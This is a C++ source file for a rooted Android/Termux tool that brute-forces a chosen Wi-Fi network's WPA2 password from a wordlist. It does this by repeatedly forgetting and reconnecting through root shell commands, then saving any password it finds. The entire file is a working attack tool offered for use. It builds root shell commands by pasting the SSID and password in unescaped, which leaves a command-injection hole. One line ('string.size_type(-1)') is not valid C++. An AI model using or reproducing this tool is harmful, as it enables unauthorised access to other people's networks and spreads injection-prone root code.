#include <iostream>
#include <string>
#include <fstream>
#include <unistd.h>
#include <vector>

using namespace std;

#define RESET   "\033[0m"
#define RED     "\033[31m"
#define GREEN   "\033[32m"
#define YELLOW  "\033[33m"
#define CYAN    "\033[36m"
#define BOLD    "\033[1m"


bool isConnected(string ssid) {
    string cmd = "su -c 'dumpsys wifi | grep \"mWifiInfo\"' > temp_res.txt";
    system(cmd.c_str());
    ifstream res("temp_res.txt");
    string line;
    while (getline(res, line)) {
        if (line.find(ssid) != string.size_type(-1) && line.find("completed") != string.size_type(-1)) {
            return true;
        }
    }
    return false;
}

int main() {
    system("clear");
    cout << CYAN << BOLD << "===========================================" << endl;
    cout << "      RONNIE WIFI PRO (TERMUX DEEP-FIX)    " << endl;
    cout << "===========================================" << RESET << endl;


    cout << YELLOW << "[*] Scanning Nearby Networks..." << RESET << endl;
    cout << "-------------------------------------------" << endl;
  
    system("su -c 'cmd wifi list-scan-results' | awk 'NR>1 {print $NF}' | sort -u");
    cout << "-------------------------------------------" << endl;

    string ssid, wordlist;
    cout << CYAN << "\nEnter Target SSID: " << RESET;
    getline(cin >> ws, ssid);

    cout << CYAN << "Wordlist Path (e.g. /sdcard/pass.txt): " << RESET;
    getline(cin >> ws, wordlist);

    ifstream file(wordlist);
    if (!file.is_open()) {
        cout << RED << "[-] Error: Wordlist file nahi mili!" << RESET << endl;
        return 1;
    }

    string pass;
    int line_count = 0;
    bool success = false;

    cout << YELLOW << "\n[!] Starting Attack on " << ssid << "..." << RESET << endl;

    while (getline(file, pass)) {
        line_count++;
        if (pass.length() < 8) continue;
        if (!pass.empty() && (pass.back() == '\r' || pass.back() == '\n')) pass.pop_back();

        cout << CYAN << "[" << line_count << "][LEN: " << pass.length() << "] " << RESET << "TRYING: " << pass << flush;

        
        string forget = "su -c 'cmd wifi forget-network " + ssid + " > /dev/null 2>&1'";
        system(forget.c_str());

     
        string cmd = "su -c 'cmd wifi connect-network " + ssid + " wpa2 " + pass + "' > /dev/null 2>&1";
        system(cmd.c_str());

    
        sleep(5); 

 
        if (isConnected(ssid)) {
            cout << GREEN << " >> [SUCCESS!]" << RESET << endl;
            cout << GREEN << BOLD << "\n[+] SAHI PASSWORD MIL GAYA: " << pass << RESET << endl;
            
      
            ofstream save("found_pass.txt", ios::app);
            save << "SSID: " << ssid << " | PASS: " << pass << endl;
            save.close();
            
            success = true;
            break;
        } else {
            cout << RED << " >> [FAILED]" << RESET << endl;
        }
    }

    if (!success) cout << RED << "\n[-] Wordlist khatam. Password nahi mila." << RESET << endl;

    file.close();
    return 0;
}
